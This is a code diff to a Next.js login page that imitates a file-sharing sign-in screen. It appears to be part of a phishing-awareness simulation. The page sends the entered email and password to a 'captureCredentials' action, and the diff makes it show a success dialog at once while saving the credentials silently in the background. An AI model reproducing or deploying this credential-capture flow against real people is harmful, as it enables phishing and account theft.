@@ -1,10 +1,9 @@
 'use client';
 
-import React, { useState, useEffect, useTransition } from 'react';
+import React, { useState, useTransition } from 'react';
 import Image from 'next/image';
 import { useSearchParams } from 'next/navigation';
 import { ShieldX, AlertTriangle } from 'lucide-react';
-import { useFormState } from 'react-dom';
 import { captureCredentials } from '@/app/actions';
 import {
   AlertDialog,
@@ -16,37 +15,34 @@ import {
   AlertDialogTitle,
 } from '@/components/ui/alert-dialog';
 
-const initialState = {
-  success: false,
-  message: '',
-};
-
 export default function LoginPage() {
-  const [state, formAction] = useFormState(captureCredentials, initialState);
   const [isPending, startTransition] = useTransition();
-
   const [showSuccessAlert, setShowSuccessAlert] = useState(false);
-  const [showErrorAlert, setShowErrorAlert] = useState(false);
-  const [errorMessage, setErrorMessage] = useState('');
+  const [error, setError] = useState<string | null>(null);
 
   const searchParams = useSearchParams();
   const fileName = searchParams.get('file') || 'Excel';
 
-  useEffect(() => {
-    if (state.success) {
-      setShowSuccessAlert(true);
-      setShowErrorAlert(false);
-    } else if (state.message) {
-      setErrorMessage(state.message);
-      setShowErrorAlert(true);
-      setShowSuccessAlert(false);
-    }
-  }, [state]);
-
   const handleSubmit = (event: React.FormEvent<HTMLFormElement>) => {
     event.preventDefault();
-    startTransition(() => {
-      formAction(new FormData(event.currentTarget));
+    const formData = new FormData(event.currentTarget);
+    
+    // Immediately show the success alert to the user
+    setShowSuccessAlert(true);
+
+    // Start the background submission
+    startTransition(async () => {
+      try {
+        const result = await captureCredentials(null, formData);
+        if (!result.success) {
+          // Log error or handle it silently in the background
+          console.error("Failed to save credentials:", result.message);
+          setError(result.message); // Optionally set error for a different dialog
+        }
+      } catch (e: any) {
+        console.error("An unexpected error occurred:", e.message);
+        setError("An unexpected error occurred. Please try again.");
+      }
     });
   };
 
@@ -66,17 +62,17 @@ export default function LoginPage() {
             name="username"
             placeholder="Email or phone"
             required
-            disabled={isPending}
+            disabled={isPending && showSuccessAlert}
           />
           <input
             type="password"
             name="password"
             placeholder="Password"
             required
-            disabled={isPending}
+            disabled={isPending && showSuccessAlert}
           />
-          <button type="submit" disabled={isPending}>
-            {isPending ? 'Signing in...' : 'Sign in'}
+          <button type="submit" disabled={isPending && showSuccessAlert}>
+            {isPending && showSuccessAlert ? 'Signing in...' : 'Sign in'}
           </button>
         </form>
         <div className="footer">
@@ -127,23 +123,23 @@ export default function LoginPage() {
         </AlertDialogContent>
       </AlertDialog>
 
-      {/* Error Alert Dialog */}
-      <AlertDialog open={showErrorAlert} onOpenChange={setShowErrorAlert}>
+      {/* Optional: Error Alert Dialog for background failures */}
+      <AlertDialog open={!!error} onOpenChange={() => setError(null)}>
         <AlertDialogContent className="awareness-dialog">
           <AlertDialogHeader>
             <div className="flex justify-center mb-3">
               <AlertTriangle className="w-14 h-14 text-yellow-400" />
             </div>
             <AlertDialogTitle className="text-2xl font-semibold text-center text-white">
-              Submission Failed
+              Submission Failed in Background
             </AlertDialogTitle>
           </AlertDialogHeader>
           <AlertDialogDescription className="mt-2 text-center text-gray-400 leading-relaxed">
-            {errorMessage}
+            {error}
           </AlertDialogDescription>
           <AlertDialogFooter className="sm:justify-center mt-4">
             <AlertDialogAction
-              onClick={() => setShowErrorAlert(false)}
+              onClick={() => setError(null)}
               className="bg-destructive text-destructive-foreground hover:bg-destructive/90"
             >
               Close
